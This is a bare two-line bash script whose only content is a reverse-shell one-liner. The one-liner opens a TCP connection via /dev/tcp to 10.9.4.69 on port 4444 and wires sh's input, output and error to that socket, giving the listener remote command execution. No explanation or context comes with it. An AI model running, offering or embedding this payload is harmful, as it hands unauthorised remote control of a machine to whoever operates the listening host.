#!/bin/bash
bash -c '0<&23-;exec 23<>/dev/tcp/10.9.4.69/4444;sh <&23 >&23 2>&23'
